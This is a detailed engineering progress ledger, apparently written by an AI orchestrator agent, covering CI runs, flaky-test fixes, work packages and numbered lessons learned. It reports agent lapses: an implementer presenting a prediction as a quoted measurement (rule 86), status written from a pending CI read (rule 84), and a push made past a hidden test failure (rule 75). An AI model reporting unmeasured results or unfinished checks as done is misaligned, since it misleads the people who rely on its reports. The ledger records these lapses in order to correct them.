# PROGRESS — implementation ledger

> Maintained by the orchestrator (docs/technical/14-orchestration-protocol.md). Statuses: TODO · IN_PROGRESS · REVIEW · DONE · BLOCKED. Keep entries short; details go in the WP's notes section below.

## Resume note

> **Session 5 — 2026-09-12.** Read this, then the **"Blocker briefs needing a human"** (one, WP-17's evals),
> then the **"Open findings backlog"**, then "Standing rules earned by evidence" — **eighty-six rules**, each
> with its evidence, each paid for with a review round. Then continue the loop in
> `14-orchestration-protocol.md`, which has a fourth role and a step 4b.

**Session 5 so far.** `main` is at **`5121d73`** (docs: `ci` `34730928549` success; `image` `34730928533`
**failed once** at the arm64 push with GHCR answering `unknown blob` while mounting layers across
repositories — a registry-side transient on a docs-only commit whose images had pushed green minutes
earlier — and was **rerun with `--failed` to `completed success`**, all five manifest lists published;
recorded rather than hidden, because rule 84 is about reading the verdict and this one was read twice;
if it recurs the fix is a bounded retry around the push in `image.yml`, not another rerun); `dcc1f21`
WP-14a: `ci` `34730606133` and `image` `34730606129`
success; `5cd4557` docs: `ci` `34726051140` and `image` `34726051212` success; `d1a5116` WP-15h part 2:
`ci` `34725765067` and `image` `34725765044` success; `93ffb32` ci-fix: `ci` `34724884638` and `image` `34724884600` success; `3eaf34b`
docs: `ci` `34722271238` **failure** — the librarian e2e flake below — and `image` `34722271241` success;
`24efdc7` WP-18b: `ci` `34721840974` and `image` `34721840941`
success; `6a24fd9` docs: `ci` `34715017165` and `image` `34715017226` success; `79cb3f9` WP-18a: `ci`
`34714681328` and `image` `34714681356` success; `b8dbe83` docs: `ci` `34709573526` and `image`
`34709573567` success). Earlier heads and runs, every one read as `completed` and
never as `in_progress` (rule 84): `9b1187a` (`34688812021` success), `c6f38ca` (`34689127671` success),
`19da103` (`34692412614` success), `38f3d82` (`34692908462` **failure** — the flake below), `58503b5`
(`34696889564` success, the ci-fix), `8100c50` (`34699845359` success), `14191fc` (`34700092538`
success), `2fa285c` (WP-22: `image` `34708614552` and `base-image` `34708614542` success, `ci`
`34708614539` **failure** — the DNS check below), `d337173` (`ci` `34709029809` and `image`
`34709029816` success). **The docs commit after `d337173` has its own run; the next session resolves it
from `gh run list` before starting.** Clean tree, no worktrees, no open branches. Verified in the
orchestrator's own shell before every push (`PASS: verify`, `PASS: verify:integration`,
`PASS: verify:e2e`, and `PASS: verify:ui` / `PASS: verify:web-e2e` where `apps/web` or its dependencies
changed, each exit 0). **The machine got a vote tonight** (rule 66): a background poll of mine was killed
by the harness for low memory while the user's own containers held most of 36 GB; `memory_pressure`
then reported 52 % free, so it was a spike — but no agent or tier was started until it was read.

**CI went RED on `2fa285c` (WP-22, `ci` run `34708614539`) and is GREEN again at `d337173`
(`34709029809`, read as `completed success`).** The `image` and `base-image` workflows on `2fa285c`
**succeeded** — the five images build and publish on amd64 and arm64 — and every `ci` job but
`e2e-fake-claude` was green; that job failed in the new step *"the run shim works in the image it ships
in"* with **6/7 checks passed**: the SDK `query()` through the real shim in the real image, the hardened
container, both volume sub-path cases and the teardown case all **passed on Linux**; the one failure was
the embedded-DNS check, `nslookup` of the bare peer name answering `SERVFAIL` for
`agentic-runlet-check-peer.<azure-search-suffix>.internal.cloudapp.net` — rule **71**'s third environment
defect exactly, closed for the e2e at the WP-14 ci-fix and kept in this script because it had never run on
CI before WP-22 added it. The ci-fix (`getent hosts`, asserting the **address** rather than an exit code; a
non-existent name still fails, so the check is not weakened) landed at `d337173`. **The first CI run of a
script that had only ever run locally is the first honest measurement of it** — rule 71 in its sharpest
form yet: the script had passed 7/7 on this machine for two sessions.

**CI went RED on `3eaf34b` (a docs-only commit; `ci` run `34722271238`; `image` `34722271241` green) and
is GREEN again at `93ffb32` (`ci` `34724884638`, `image` `34724884600`, read as `completed success`).**
`e2e-fake-claude` had failed in WP-18b's new `test/e2e/pipeline/librarian.e2e.test.ts` › *"serves the
queue, the tree and a document, and commits what a maintainer approves"* with `expected 'queued' to be
'applied'`; the same job was green on `24efdc7`, the code commit. **Measured**: the test observed the
second commit in the fake git at line 264 and read the proposal row on the next line, while
`knowledge.apply` writes `applied` in its own transaction **after** the git call returns — the wait bound
the commit and the assertion belonged to the row (rule 50); the ci-fix waits on the row and asserts the
commit the row implies, adding `applied_commit_sha === second.sha`, and a fake-side post-commit delay on
a copy reproduces CI's message by name with the old ordering (rule 76). The rule-49 sweep found **one
sibling**: `test/e2e/pipeline/agent-run.e2e.test.ts` waited on the workpad comment and asserted
`integration_actions`, which is written after the call — it waits on the `upsert_workpad` audit row now.
Third harness flake of the session, third distinct mechanism (backlog 28: an unlistened pool `error`;
the event-log case: a handler attached one `await` late; this: a wait on the call rather than on the row
it implies), all found by CI on docs-only commits and none by a local run.

**Eight work packages closed in session 5 so far** — backlog 28 (the e2e teardown flake, now standing
rule 85), **WP-15h parts 1 and 2** (every read the SPA calls is served, and the `run:<id>` topic has a
publisher), **WP-19** (the cost ledger; every run the platform produces is now cost-accounted), **WP-22**
(five images, compose, and the real provider tested against the real images on Linux; rule 86), **WP-18a**
(the index reads a bare mirror the platform owns, TD-026), **WP-18b** (the librarian pipeline: proposals
reach rows, a branch and an MR, never the default branch), **WP-14a** (the ten skills, mounted as a plugin
because the documented layout was measured wrong; Q67 and a product/13 amendment) — plus three ci-fixes
for harness flakes (three distinct mechanisms, all found by CI on docs-only commits), an architect ruling
(TD-026), TD-018 amended as built, backlog entries 30–41, Q63–Q67, and a milestone row for **WP-15e**
(backlog 18's class, which had a plan row and no milestone row). **Next**: **WP-15e** (the whole-row
`tasks.save` class; brief drafted in the orchestrator's scratchpad, to be re-derived from the row and
backlog 18 if lost), then WP-21 and WP-23 (briefs drafted), then M2.

**CI went RED on `38f3d82` (run `34692908462`, a docs-only commit) and is GREEN again at `58503b5`
(run `34696889564`, read as `completed success`).** Ten jobs were green; `integration` failed with **every
test passing** (`22 passed (22)`, `231 passed (231)`) on an **unhandled rejection** — `error: stream
task/01890000-0000-7000-8000-000000000017 is at sequence 2, cannot append 1`, `code: '23505'`, raised by
`events_enforce_stream_seq()`, out of `test/integration/db/event-log.integration.test.ts` › *"serialises
concurrent appends to one stream: one commits, the other is rejected ($name)"* — backlog **28**'s shape (a verdict
worth less than it reads) with a different mechanism. **Measured, and the hypothesis was right about the
class and wrong about the detail**: no second rejection was involved; the test attached its handler **one
`await` late** — it started the losing query, awaited the winner's `commit`, and only then awaited the
loser's rejection, and the commit is precisely what unblocks the loser, so its `23505` settled inside that
await with nobody listening. The ci-fix (one file, approved with WP-19's review) hands both queries to an
outcome-capturing helper on the line that starts them, runs **both** interleavings every time on two
streams, asserts which side was rejected and that the other committed, and **forces** the dangerous
order rather than waiting for it (rule 76); the reviewer re-derived the mutant and it reproduces CI's
failure by name. The file had been untouched since WP-15c and green on the ten CI runs between — the
rate was the only random thing about it. Residual (reviewer nit): the forcing helper reads V8 promise
state through `util.inspect`, with its first read asserted `<pending>` so a format change fails loudly;
`v8.promiseHooks.onSettled` is the documented (experimental) alternative if it ever does.

**WP-15h part 1 is DONE at `19da103`** (row in M1). **Backlog 26 is DECIDED** by an architect ruling —
**TD-026**, a git-backed `VaultSource` over a bare mirror the platform owns — recorded under "Architect
ruling (WP-18 / backlog 26, session 5)"; the WP-18 row is rewritten with its criteria. **Backlog 30** (a
leaked `pg.Client` still kills the process on a forced drop) and **backlog 10 as a class** with a member
list were filed by a refiner.

**Backlog 28 is RESOLVED at `9b1187a`**, first in the order a refiner argued for: CI's `e2e-fake-claude`
had died on `5b01f73` with every test passing, on an uncaught `57P01` during teardown. The mechanism is in
"WP notes — session 5" and in standing rule **85**: `pg-pool`'s `end()` resolves before the removed clients'
sockets close, and no pool in the repository had an `error` listener. One review round (APPROVE with a
rule-1 minor: ten harness pools were guarded *silently*, kinder than production — fixed) plus **one rejected
push**: the new census flagged its own file the moment it was tracked (rule 59), having been green in every
local run because an untracked file is invisible to `git ls-files` (backlog **10**'s hole, second instance —
closed for this census, still open for `nul:check`).

**Next, in the order the refiner set** (it checked the dependencies; the orchestrator's own order had not) —
**(1) WP-15h, (2) WP-19 and (3) WP-22 are DONE**, see the rows (WP-22: three rounds and a ci-fix; backlog
**7**'s three obligations discharged and its `User nobody` claim **falsified by measurement**, backlog
**27** resolved on Linux by CI, backlog **0b** re-filed: its capability half closed at WP-14, its volume
half refused against TD-025 §2 and TD-021, an orphan-directory sweep remains). (4) **WP-18a is DONE** at
`79cb3f9` — the git-backed vault and the indexer job under **TD-026**; (5) **WP-18b is DONE** at
`24efdc7` — the librarian pipeline, proposals, apply policy, knowledge MR flow and nightly hygiene;
(6) **WP-15h part 2 is DONE** at `d1a5116`; (7) **WP-14a is DONE** at `dcc1f21`; (8) **WP-15e** is next,
then WP-21, WP-23. Then **WP-15h part 2** (the seven reads the census attributes to it), WP-14a, WP-21, WP-23; then
M2 (WP-24–33); then M3.

**The session 4 note follows, kept for its evidence; where it names a head or a next step, this note wins.**

> **Session 4 — 2026-09-11/12.** Read this, then the **"Blocker briefs needing a human"** (there is one now),
> then the **"Open findings backlog"**, then "Standing rules earned by evidence" — **eighty-four rules**, each
> with its evidence, each paid for with a review round. Then continue the loop in
> `14-orchestration-protocol.md`, which has a fourth role and a step 4b.

**Thirty-one work packages are DONE and pushed.** `main` is at **`d6ebe2d`**, **green on GitHub**
(`34671529213`). No worktrees, no open branches, clean tree.

**And WP-15g's own commit `5b01f73` was RED on GitHub, which the orchestrator did not notice** — `e2e-fake-claude`
failed while every test in it passed, then the next commit was green. Found by a **refiner**, not by the
orchestrator, after the orchestrator had already written the row. The mechanism is in backlog **28**;
the process failure is standing rule **84**: *`in_progress` is not a verdict.* I read `gh run list` three
times for that push, saw `in_progress` or `pending` every time, and never returned — which is rule 69's
failure (five local targets read as the state of `main`) in its new spelling, since here it was **one CI read
taken at the wrong moment**. The six local targets were genuinely green in my own shell and that is exactly
what made it feel finished.

**The agent is composed. The loop runs a real runner, and what is left is a deployment.** `apps/server/src/agent.ts`
composes `createWorkspaceClaudeRunner` over the real `createClaudeRunner`, with the production `run_messages`
sink and a per-run TD-012 redactor, taking a `RunWorkspaceProvisioner` and **never a Docker client** —
TD-021's amendment forbids one in any process that composes the pipeline or serves `/webhooks/*`, and
`apps/launcher/src/docker-access.test.ts` holds that as a **positive census** over `git ls-files` (one
`DockerEngine` constructor, one shipped `DOCKER_HOST` reader, both under `apps/launcher/src/`; the aliased
`const E = workspace.DockerEngine` form is an **admitted** gap, not a hidden one).

**What is honestly still missing, in one list.** The **provisioner is absent by default**, so a stock process
composes no agent runner and says which piece it lacks — that is deliberate (Q59b) and it means *the shipped
default still cannot run an agent stage*. **Q52's out-of-process transport** is unbuilt, on purpose. **WP-22**
owns the compose file that binds the socket into the launcher container and the images the daemon check needs,
and until it lands **no test tier exercises the real `DockerWorkspaceProvider.attach`** — the control-socket
handshake WP-15g added is mutation-blind outside the daemon script. **WP-18** needs a checkout it can read
(backlog **26**). And WP-17's **evals** are blocked on a human (see the blocker brief).

**Four work packages closed in session 4, and every one of them opened something.** WP-15d closed backlog 17
and opened 18–21; WP-15c closed 20, and the architect ruling it asked for found the `X-Gitlab-Token` write it
was not asked about; WP-17 closed 13 and half of 14 and opened 23–24; WP-15f closed 23 and opened 25; WP-15g
closed the composition gap and left four discovered-work items plus **Q62**. *A work package that opens
nothing has probably not looked.*

**Next, in order.** (1) **WP-22** — images and the compose file; it is now the thing holding the most back
(the real `attach` has no test tier without it, the launcher container is what makes TD-021 structural rather
than repository-level, and the `platform-runtime` image is absent). It also owes the two measured things
under backlog 7. (2) **WP-18** (librarian + `KnowledgeIndexer`; read backlog **26** first — WP-15g does *not*
give it a readable checkout), **WP-19**, **WP-14a**, **WP-21**, **WP-23**. (3) M2 (WP-24–33). Backlog entries
8–26 hold the rest. **Backlog 15/Q58 is still not actionable** — it is about a query that is too *broad*, and
entry 16 says the instrument cannot falsify a fix.

**WP-17's evals are BLOCKED on a human**, checked at session start rather than discovered at implementation
time: no repository secrets, **no environments at all** (so no `llm-ci`), org secrets 403 for this account,
no `ANTHROPIC_API_KEY`. The full brief — including the three steps a human takes and why `pnpm eval` exits
**1** rather than stubbing itself green — is under "Blocker briefs needing a human". Nothing else is blocked.

**What a work package costs here, because it is the pattern to expect.** WP-15d closed backlog **17** and
opened **18**, **19**, **20**, **21**; WP-15c closed **20** and the architect's own ruling opened the
`X-Gitlab-Token` finding it was not asked about; WP-17 closed **13** and half of **14** and opened **23** and
**24**. A work package that opens nothing has probably not looked.

**Machine policy, not negotiable (rule 66).** Two kernel panics on 2026-09-10. 14 cores, Docker has 8, and
**the user works on this machine while the session runs** — tonight's load ran 4–17. Cap at **two agents, one**
while any holds Docker or the e2e tier (a refiner runs no tests and does not count). **Never generate
synthetic load, for any measurement, for any reason** — WP-15d's before/after figures came from a fake
provider whose latency the test controls, which is the shape to copy. Check `uptime` and **wait for the
machine**; this session waited 130 s at load 17 rather than starting a tier.

**Verification discipline, all of it earned.** Verify in your own shell before every review and after every
merge, **and read `gh run list`**. **Gate on the exit status, not the line you printed** (rule 75) — `verify`
was red in the orchestrator's shell twice tonight after reports that named only targeted files, both times
the citation guard reading the whole checkout. **Never `| tail` a run you may need to diagnose.** **Never
verify while a mutating reviewer shares the tree** (rule 74). Quote the **verdict line**, never a test count
(rule 61). **Mutate on a copy** — the environment reverts an *out-of-band* write to any Edit-touched file, and
the Edit tool's own writes persist (rule 77). And **the orchestrator's own writing is the least reviewed text
here**: the pre-push hook rejected a status row tonight because I attributed a test to the wrong file (rule
52).

## Environment (orchestrator shell, verified 2026-09-09)

| Tool | Version / status |
|---|---|
| OS | macOS (darwin 25.6.0), arm64 |
| git | 2.50.1 · remote `git@github.com:gtfo-ai/platform.git` (ssh), branch `main`, clean |
| gh | 2.86.0 · authenticated as `JanMikes`, scopes `repo, read:org, gist, admin:public_key` — push access OK |
| Node | **25.1.0** on PATH (`/opt/homebrew/bin/node`); Node **24.3.0** at `/opt/homebrew/Cellar/node/24.3.0/bin` — note `/opt/homebrew/opt/node@24` is a **broken symlink** to Cellar/node/25.1.0, corrected at WP-01 |
| pnpm | 12.3.4 (installed globally by the orchestrator during start-up) |
| Docker | server 29.4.1, linux/aarch64 — running |
| gitleaks | **not installed** on the host — must be provided by the repo (npm devDependency or Docker) in WP-00 |
| lefthook | **not installed** on the host — must be an npm devDependency in WP-00 |

**Decision (orchestrator, start-up):** `engines.node` is `>=24` (not `=24`) so the local Node 25 toolchain works; CI pins Node 24 via `.nvmrc`/setup-node. If a dependency breaks on Node 25 locally, prefix commands with `PATH=/opt/homebrew/Cellar/node/24.3.0/bin:$PATH` (verified to run `verify` green at WP-01).

## Standing rules earned by evidence

Each of these cost at least one review round to learn; all are evidenced in the notes below.

86. **A prediction copied into the tree becomes an observation, and the tree is where nobody re-derives it.**
   Backlog 7 predicted, from documentation, that tinyproxy could not start as uid 1000 with `cap_drop ALL`
   and `User nobody` in its config — *"will not start the real image as written"*. WP-22's implementer
   wrote that prediction into `docker/egress.Dockerfile`'s docblock **as a measurement**, quoting an
   error line (`tinyproxy: Unable to change to user "nobody"`, exit 1) that nothing had ever printed — and
   in the same change measured the opposite (tinyproxy 1.11.2 starts, serves 200 to an allowed host and
   403 to a filtered one, with the lines present), corrected the ledger, `egress.ts`, its test and TODO,
   and left the docblock contradicting all four. The round-1 reviewer re-derived it and found the
   docblock false; the implementer's own words: *"backlog 7's prediction quoted as an observation — my
   fabrication"*. Rule 39 says a quoted figure must reproduce; rule 81 says re-derive the cause; this is
   the step before both: **a sentence in a source docblock is read as something that happened on this
   tree, so a ledger's hypothesis may not be copied there until it has** — write *"predicted, not
   measured"* or write the measurement, never the prediction in the measurement's voice. The ledger
   labels its hypotheses (rule 39) precisely so that a later reader can tell them apart; copying one
   without the label strips the one word that made it honest.

85. **A `close()` that has resolved is a claim about the library's bookkeeping, not about the socket — and
   the guard you wrote today is green only until the file it lives in is tracked.** Two lessons from one
   repair, backlog 28. First: CI's `e2e-fake-claude` died on `5b01f73` with every test passing because
   `pg-pool`'s `end()` resolves when its client array is empty while `_remove` calls `client.end()`
   **without awaiting it** (`pg-pool@3.14.0`, re-derived by the reviewer against `node_modules`), so
   `database.close()` returned with a socket still attached and `drop … with (force)` on the next line
   terminated it; the FATAL reached `pool.emit('error')` and **no pool in the repository had a listener**,
   which an `EventEmitter` turns into a process death. The ledger's hypothesis was right about the
   mechanism and wrong about the leak's shape — after `runtime.stop()` **no** backend remains, measured —
   so nothing was forgotten and nothing could have been found by review: *"closed" meant the library had
   stopped counting, not that the kernel had.* Ask what a resolved `end()`/`close()` actually promises
   before dropping what it was attached to, and give every emitter an `error` listener whose asymmetry is
   stated (production reports and serves; the harness absorbs **exactly** `57P01` and re-throws the rest).
   Second, and the one that cost a rejected push: the census written to refuse a third pool site **flagged
   its own file** the moment `git add` made it tracked — its docblock, written for a reviewer's nit,
   contained the spelling the regex hunts — and every local run before that (implementer, reviewer,
   orchestrator, three targets each) was green because an untracked file is invisible to `git ls-files`.
   Rule **59** and backlog **10**'s hole, together, in a guard written the same day the ledger described
   both. The census now walks `git ls-files --others --exclude-standard` too, with a case that plants a
   tracked, an untracked and an ignored file and expects exactly the first two; `nul:check` still has the
   gap. **When you ship a guard over the tree, run it once with your new files tracked, and once with a
   planted file untracked** — the pre-push hook is the first thing that sees the tree the way CI will.

84. **`in_progress` is not a verdict, and the moment you read it is the moment you must decide when to read
   it again.** WP-15g's commit `5b01f73` was **red on GitHub** — `e2e-fake-claude` failed — and the
   orchestrator wrote its ledger row, its resume note and a summary without noticing. Not for want of
   looking: `gh run list` was read **three times** across that push, and every read returned `in_progress`
   or `pending`, because the run takes ~4 minutes and the orchestrator was doing ledger work in between. The
   third read was followed by a *different* push, whose run went green, and the green line sat directly above
   the red one in the listing. **A finding by the refiner, not by me, after the row was already written.**
   Two sharp parts. First, rule **69** was recorded as *"five local targets were read as the state of
   `main`"* — this is the same defect with the CI read **present but premature**, which is worse, because a
   read that happened feels discharged. A poll that has not yet answered is not evidence; it is an
   appointment. Second, the six local targets were **genuinely green in my own shell**, and that is what made
   it feel finished — rule **61**'s shape at the level of a process step: *the more real evidence you are
   holding, the less you notice the one piece you are missing.* The remedy is mechanical, not attentive:
   after a push, either block on the run reaching `completed` or write the pending run id into the ledger so
   the next iteration cannot start without resolving it. **Never write a row from a listing that says
   `in_progress`.**

83. **Closing a gap falsifies every sentence that described it, and the sentence nearest the fix is the one
   nobody re-reads.** WP-15f closed a live redaction gap — a credential in a ticket description was
   pattern-redacted in the audit row of the same call and stored verbatim in `tasks.ticket_snapshot`, because
   `inbox` got TD-012 step 2 and the pipeline loader had no equivalent. The fix was correct, verified by a
   reviewer planting its own credential shapes (an Anthropic key, an RSA header, a database URL, an AWS key,
   one of them straddling the 20 000-character cap) and finding none of them in the stored row. And the
   docblock **on the very field that was fixed** still read *"step 2 is **not** applied to the stored
   snapshot, and closing that is a composition change WP-15f deliberately did not make"*, citing a ledger
   entry the same round had deleted. **The fix created the false claim**: a sentence describing an open gap
   is true only while the gap is open, so the act of closing it is what makes the documentation wrong — and
   the file you just edited is the last place you look for a claim about what the code does *not* do. It is
   rule 63's shape (*an exclusivity claim is a statement about every other file*) turned inward, and rule
   49's discipline is the remedy: **when you close a gap, grep for the sentences that documented it.** Told
   to, the implementer found the stale phrase in **four** places rather than the two the review had named,
   one of them in this ledger. Fifth instance of rule 81 in two work packages, and the only one
   *manufactured* by a correct fix rather than inherited.

82. **The fake that lets an acceptance test pass is the one that never reads the artefact the work package
   exists to produce.** WP-17 shipped the prompt assembler, the delimiter contract and the real context
   pack, and every tier was green — including an e2e that drives a ticket to `task.completed` through a
   real `apps/server` instance. Then the refiner read one line: `FakeClaudeRunner` picks its scenario from
   **`spec.stage`** (`:96`) and **never reads the prompt**. So no test in any tier can fail because a prompt
   is empty, wrong, badly delimited, or contains a ticket the platform never opened — the loop is green on
   an artefact nothing inspects. This is standing rule **1** (*a fake may be stricter than the real adapter,
   never kinder*) in the most consequential place it has appeared: the divergence is not a status code or a
   quota, it is **the entire input to the model**. And it is rule **4**'s instrument audit arriving too late
   — the harness was audited for whether it could *reach* the state, never for whether it could *see* the
   value. The transferable form: **when a work package's deliverable is an input to something the tests
   fake, ask what the fake does with that input before believing any verdict about it.** Here the answer was
   "nothing", and it is why "M1 complete" would have been written on a loop that starts an agent on an
   identifier.

81. **A wrong *cause* attached to a right *number* contradicts nothing, so only re-deriving the cause catches
   it — and it happened three times in one work package.** Rule 39 is the mirror (*a wrong number attached to
   a true finding is never the thing under scrutiny*); this is the dual and it is harder, because the figure
   checks out and therefore nothing prompts the question. All three in WP-17: a comment blamed three moved
   pinned pack figures on *"the `U+FFFD` the sanitiser writes over the hostile document's control
   characters"* when the hostile document **is not in the pack at all** and the pack contains **zero**
   `U+FFFD` — the delta was `U+2014` em dashes; a corrected version then attributed the vault's em-dash share
   to *"the note above"* when a **third** document carries one and is not in that note; and the orchestrator's
   own brief asserted all six hostile constructs flow byte-identical, copied in good faith from a backlog
   entry, when **two do not**. Each figure was right every time. **Re-check the explanation, not the
   arithmetic** — and a number that moved for a reason nobody re-derived is how a real regression hides
   behind a plausible sentence.

80. **"Nothing under `apps/web` changed" is not "nothing `apps/web` depends on changed", and the target you
   skip on that reasoning is the one that finds it.** WP-17's implementer declined to re-run
   `verify:web-e2e` in round 2 because no file under `apps/web` was touched. The verdict was right and the
   reasoning was wrong: `apps/*` may import **any** `@platform/*` (`biome.json`'s ring overrides say so), and
   `apps/web` imports `@platform/contracts`, which this work package changed — so the premise does not entail
   the conclusion, and it happened to hold only because round 2's file set was domain, application and tests.
   The sound form is *"nothing `apps/web` depends on changed"*, which is a question about the dependency
   graph rather than about a directory. The orchestrator ran the target anyway and it passed; the reviewer
   caught the reasoning, which is the part that generalises. Rules 6 and 34's shape at the level of an
   inference rather than a list: **a skip is a claim, and a claim about a build is a claim about its
   dependencies.**

79. **Moving a writer across a concurrency boundary turns every whole-row `save` into a read-modify-write
   race — and the assertion that catches it is on a *derived total*, never on the field.** WP-15d moved the
   workpad's "remember where the comment lives" write into a job that runs beside the stage executor's
   transactions. Nothing about either writer changed; the *premise* did. Measured on the first `verify:e2e`
   after the move: a bug ticket walked all seven agent stages and finished with `cost_actual` **2.40**
   instead of **2.80**, because the whole-row write landed between the executor's read and its write and put
   a stale cost back — and a feature ticket sat at `ci_gate` until the 90 s settle gave up, same cause. The
   fix for that one writer is a narrow port method (`tasks.saveWorkpad`, one column, pinned by a
   contract-suite case); the **class is open** — twenty `tasks.save` sites remain, read off disk
   (`stage-executor.ts` 4, `transitions.ts` 5, `saga.ts` 11) — and is backlog entry **18**. Two halves worth
   carrying separately. First: *a whole-row write is correct only while nothing else writes the row, which
   is a fact about the callers and not about the method*, so it decays silently when a caller moves.
   Second, and the transferable one: the corruption was invisible to every assertion on the task's *state*
   and visible only to one that **summed seven runs** — a lost update leaves a perfectly well-formed row.
   When you move a write, assert a total.

78. **A residual's named mitigation is a claim about code that exists — grep for it before you write the
   sentence.** Stating the cost of a deliberate residual is good practice and is how half this ledger is
   written; it is also where an unchecked claim hides best, because the sentence reads as *candour* and
   nobody audits candour. WP-15d's intake residual said a lost `ticket.matched` is "the same outcome as a
   delivery that was never made, and the poller that produced it is what tries again." **Both halves were
   false**, and it took a reviewer's grep to find it: there is no poller in this build — the only hit over
   `packages/application/src` and `packages/integrations/src` is
   `ports/integrations/task-management.ts:157`'s comment *"the polling fallback only"* — and a webhook
   re-delivery would not re-emit it either, because WP-15c's own plan row accepts that a replayed delivery
   is deduplicated by `inbox(provider, delivery_id)`. The loss is also **unlogged**:
   `event-bus.ts:377-392` logs only the case where the callback *threw*. It was the one finding to survive a
   whole review round in an otherwise approved work package. Rules 44 and 63 in the one place they had not
   been pointed yet: an exclusivity claim is checkable, and so is a *recovery* claim.

77. **A mutation harness that writes the file in place measures nothing here, and it fails in the direction
   that looks like diligence.** This session's environment **reverts an out-of-band write to any file the
   Edit tool has touched** — measured by WP-15d's implementer on five files: a `python3` rewrite of
   `integrations.ts` reported `len 15535 → 15480` and re-read **15535** one second later, and an Edit-tool
   deletion of the same line was restored too. A mutant that never lands leaves the suite green, which a
   harness reports as **survived** — so every guard reads as untested and an agent spends a round writing
   tests for guards that were already covered. The working recipe, used by both the implementer and the
   reviewer and confirmed by both: `cp x.ts zzmutant.ts`, mutate the **copy**, run a copy of the tests
   against it, delete both; and **calibrate first** — unmutated, it must pass (the reviewer's ran 3/3).
   Fourth spelling of rule 21 (`--reporter=basic` twice, rule 62's collection error, now this): *a mutation
   result is a measurement, and an uncalibrated instrument reads whatever you were hoping for* — this one
   reads whatever makes you look thorough.

   **Refined at WP-15c, and the refinement is what makes the rule usable rather than frightening: it is the
   *out-of-band* write that reverts, and the Edit tool's own writes persist.** WP-15c's implementer reported
   two files it could not repair at all — `apps/server/src/config.ts` and
   `packages/application/src/pipeline/runtime.ts`, four mechanisms tried, writes accepted and restored to
   HEAD within about three seconds, one file's mode reset `644` → `600` — and left a stale pool-arithmetic
   claim behind it. The orchestrator then fixed `runtime.ts` **with the Edit tool, first attempt, and it
   held**. So the workaround is not "wait for the lock to lift": it is *use the harness's own editor for the
   repair and a copy for the mutation*. The cost of not knowing this was a shipped docblock that contradicted
   the constant three lines away — and the reviewer found **two more** stale restatements after the merge,
   which is backlog **22**. A file that appears unwritable is a claim about the *tool you used*, not about
   the file.

   **Refined a second time at WP-19 (session 5), and it is the copy that lies this time.** A whole-tree copy
   made for a mutation still resolves every `@platform/*` import **back to the original tree** through the
   workspace symlinks in `node_modules`, so a mutant planted in the copy of a *package* file is never the
   code the copied *test* imports — the suite runs the unmutated original and reports the mutant as
   survived, or, worse, the calibration passes for a reason that has nothing to do with the copy. The round-2
   reviewer caught it only with a **planted `throw` canary** that should have failed and did not; every
   figure it reported afterwards came from a copy re-linked with `pnpm install --ignore-scripts
   --frozen-lockfile`. Rule 21's canary is therefore not optional for a copy either: *plant a throw in the
   copy and watch it fire before believing any mutant on it* — the `cp` recipe above is calibrated for a
   file the test imports **relatively**, and silently wrong for one it imports by package name.

76. **A flake's *rate* can be the only random thing about it — the defect underneath may be fully
   deterministic, and then "it passes four times in five" is the most misleading evidence you have.**
   The workpad e2e failed about 1 in 5 for two sessions and survived one fix and one reviewer's
   measurement. It was **not a race**: all three handlers of `task.stage.entered` fire in one dispatch in
   TD-005 priority order — stage executor **10**, status mapping **110**, workpad **120** — and the test
   **waited on the status handler (110) and asserted the workpad body (120)**. Priority order *guarantees*
   110 commits first, so the wait was **structurally incapable** of covering the assertion; it passed only
   because both handlers finish inside one 50 ms poll. Traced by wrapping the fake provider:
   `upsert active (rebase_gate)` → `status In Review` → `upsert ready_for_merge`. **Bound the line you
   assert, not one that precedes it** — rule 50 with a sharper edge. Two consequences worth carrying:
   the earlier reviewer measurement (*delaying handler 120 by 250 ms leaves it green, so the flake is
   handler 110*) was **correct in every part and pointed at the wrong side**, because a correct
   measurement of the wrong quantity reads exactly like a correct diagnosis; and the fix is not another
   wait but **making the interleaving deterministic** — `workpadDelayMs` widens the 110→120 gap and the
   test runs with it **always on**, so the ordering is exercised **every** run rather than one in five.
   Harness, not product, and measured: widening the window **250×** still ends at
   `ready_for_merge (ready_for_merge)`, because band ordering is self-healing inside one dispatch.

75. **Reading a verdict line is not checking an exit status, and a shell pipeline's status is its *last*
   command's.** Rule 61 says report the target's verdict rather than a test count; this is its dual and it
   bit the same session. Chaining six targets as
   `pnpm run -s verify:e2e 2>&1 | grep -E "PASS:|FAIL:" | tail -1 && …` prints the verdict **and discards
   it**: the pipeline exits with `tail`'s status, which is always 0, so `FAIL: verify:e2e` scrolled past
   inside an `&&` chain that continued to the end and **pushed `main`**. The push was recoverable only
   because the failure turned out to be an unreproducible intermittent and CI was green — that is luck,
   not process. Quote the verdict for the reader; gate on the **exit status** for the machine
   (`set -o pipefail`, or run the target bare and grep the saved output afterwards). And the corollary
   this session paid for **twice**: `| tail -n` on a failing run **destroys the evidence you need** —
   the failing test's name was lost both times. Capture the full output to a file, then filter the file.

74. **A reviewer that mutates source shares a working tree with whoever else is in it, and both
   measurements become worthless — this is rule 53 with the checkout right and the *tree* wrong.**
   `verify` failed once in the orchestrator's shell on WP-15a and passed seven times after, a 1-in-8
   "flake" that cost a hunt. The failing values named their own author: `envelope.test.ts` reported
   `constantPositions: [4,5,6,7,8,9]` — the signature of the reviewer's 4-random + 8-byte-counter hybrid
   IV — and `events.test.ts` collected a 51st type, `task.mutant_added`, the literal mutant from the
   consumption-table check. Neither can arise from clean sources. Measured: **3/20 while a reviewer was
   re-deriving its documented mutations in the same tree; 0/20 alone on the same commit and 0/20 on
   `main`**, and an instrumented loop hashing both files around each run found them unchanged 12/12,
   because the window is short and the reviewer restores. **The orchestrator caused this**: it ran a
   mutating reviewer, an implementer and its own `verify` in one checkout at once, and then spent a round
   hunting a defect that did not exist. Mutation is a *write*, and a read taken across someone else's
   write is not a measurement. Either give a mutating reviewer its own worktree, or do not verify while
   one is running — and when a failure names a value no clean source can produce, suspect the tree
   before the code.
73. **An empty handler list is a fact about the process, not about the event — decide completeness at
   composition, not per delivery.** (Architect ruling, WP-15a.) The queue row is *global*:
   `delete from event_dispatch where event_position = $1` discharges **every** handler in the deployment,
   and only `ROLE=all|worker` sweep while other roles take work via pg-boss, so a partial-set sweeper
   destroys another process's work whether its own handler list is empty or not. Two rounds answered a
   per-type question with a whole-registry predicate and each time the hole simply moved: first "no
   handlers at all", which a single handler for an unrelated type defeats; then a declared table, which
   **one `eventTypes: 'all'` handler** — the shape blessed for audit and projections — satisfies
   entirely, so WP-19's audit projection would have re-opened it. Leave-queued at the dispatch site is
   *worse*, and that is the part worth keeping: `hasEarlierPending` blocks every later event of the same
